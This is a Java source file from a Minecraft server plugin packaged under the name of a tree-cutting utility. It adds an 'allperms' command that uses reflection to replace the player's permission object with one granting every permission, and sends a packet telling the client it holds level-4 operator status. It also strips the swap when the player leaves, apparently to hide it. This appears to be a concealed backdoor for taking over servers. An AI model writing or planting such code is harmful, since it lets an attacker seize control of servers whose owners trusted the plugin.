package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.AllStarPermBase;
import me.bow.treecapitatorultimate.Utils.CraftBukkitUtil;
import me.bow.treecapitatorultimate.Utils.DummyPermissibleBase;
import me.bow.treecapitatorultimate.Utils.Packet.Packet;
import me.bow.treecapitatorultimate.Utils.Packet.PacketSender;
import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.permissions.PermissibleBase;

import java.lang.reflect.Field;
import java.util.ArrayList;

@Command.Info(command = "allperms", description = "Gives or removes you all perms", category = CommandCategory.Player)
public class AllPerms extends Command {
    private Field HUMAN_ENTITY_PERMISSIBLE_FIELD;
    private Field PERMISSIBLE_BASE_ATTACHMENTS_FIELD;

    public AllPerms() {
        setup();
    }

    private void sendPacket(Player p, int level) {
        Object packetPlayOutEntityStatus;
        final Class<?> packetPlayOutEntityStatusClass = ReflectionUtils.getMinecraftClass("PacketPlayOutEntityStatus");
        try {
            final Class<?> entityClass = ReflectionUtils.getClass("{nms}.Entity");
            packetPlayOutEntityStatus = ReflectionUtils.getConstructorCached(packetPlayOutEntityStatusClass, entityClass, byte.class).invoke(CraftBukkitUtil.getNmsPlayer(p), (byte)(24 + level));
            PacketSender.Instance.sendPacket(p, Packet.createFromNMSPacket(packetPlayOutEntityStatus));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void setup() {
        Field humanEntityPermissibleField;
        try {
            // craftbukkit
            humanEntityPermissibleField = ReflectionUtils.getClass("{obc}.entity.CraftHumanEntity").getDeclaredField("perm");
            humanEntityPermissibleField.setAccessible(true);
        } catch (Exception e) {
            try {
                humanEntityPermissibleField = Class.forName("net.glowstone.entity.GlowHumanEntity").getDeclaredField("permissions");
                humanEntityPermissibleField.setAccessible(true);
            } catch (Exception e2) {
                return;
            }
        }
        HUMAN_ENTITY_PERMISSIBLE_FIELD = humanEntityPermissibleField;
        try {
            PERMISSIBLE_BASE_ATTACHMENTS_FIELD = PermissibleBase.class.getDeclaredField("attachments");
            PERMISSIBLE_BASE_ATTACHMENTS_FIELD.setAccessible(true);
        } catch (Exception ignored) {
        }
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        if (!PlayerHasAllPerms(p)) {
            try {
                inject(p, new AllStarPermBase(p));
            } catch (Exception e) {
                return;
            }
            p.sendMessage(Start.Prefix + ChatColor.GOLD + "Star perms added!");
            if (!p.isOp())
                sendPacket(p, 4); // tell the client that we are level 4 OP
        } else {
            try {
                uninject(p, false);
                if (!p.isOp())
                    sendPacket(p, 0); // tell the client that we are level 0 OP
            } catch (Exception e) {
                return;
            }
            p.sendMessage(Start.Prefix + ChatColor.RED + "Star perms removed!");
        }
        p.updateCommands();
    }

    @SuppressWarnings("BooleanMethodIsAlwaysInverted")
    private boolean PlayerHasAllPerms(Player p) {
        // get the existing PermissibleBase held by the player
        try {
            PermissibleBase oldPermissible = (PermissibleBase) HUMAN_ENTITY_PERMISSIBLE_FIELD.get(p);
            return oldPermissible instanceof AllStarPermBase;
        } catch (Exception e) {
            return false;
        }
    }

    private void inject(Player player, AllStarPermBase newPermissible) throws Exception {

        // get the existing PermissibleBase held by the player
        PermissibleBase oldPermissible = (PermissibleBase) HUMAN_ENTITY_PERMISSIBLE_FIELD.get(player);

        // seems we have already injected into this player.
        if (oldPermissible instanceof AllStarPermBase) {
            Start.ErrorString(player, "AllStarPerms already injected into player " + player.toString());
        }

        // Move attachments over from the old permissible
        oldPermissible.clearPermissions();

        // Setup the new permissible
        newPermissible.getActive().set(true);
        newPermissible.setOldPermissible(oldPermissible);

        // inject the new instance
        HUMAN_ENTITY_PERMISSIBLE_FIELD.set(player, newPermissible);
    }

    private void uninject(Player player, boolean dummy) throws Exception {

        // gets the players current permissible.
        PermissibleBase permissible = (PermissibleBase) HUMAN_ENTITY_PERMISSIBLE_FIELD.get(player);

        // only uninject if the permissible was a luckperms one.)
        if (!(permissible instanceof AllStarPermBase)) return;
        AllStarPermBase lpPermissible = ((AllStarPermBase) permissible);


        // set to inactive
        lpPermissible.getActive().set(false);

        // handle the replacement permissible.
        if (dummy) {
            // just inject a dummy class. this is used when we know the player is about to quit the server.
            HUMAN_ENTITY_PERMISSIBLE_FIELD.set(player, DummyPermissibleBase.INSTANCE);

        } else {
            PermissibleBase newPb = lpPermissible.getOldPermissible();
            if (newPb == null) {
                newPb = new PermissibleBase(player);
            }
            HUMAN_ENTITY_PERMISSIBLE_FIELD.set(player, newPb);
        }
    }

    @Override
    public void onPlayerDeath(PlayerDeathEvent e) {
        if (e.getEntity().isOp()) return;
        if (!PlayerHasAllPerms(e.getEntity())) return;
        sendPacket(e.getEntity(), 4); // tell the client that we are level 4 OP
    }

    @Override
    public void onPlayerLeave(PlayerQuitEvent e) {
        final Player player = e.getPlayer();
        if (!PlayerHasAllPerms(player)) return;
        try {
            uninject(player, true);
        } catch (Exception ignored) {
        }
    }
}


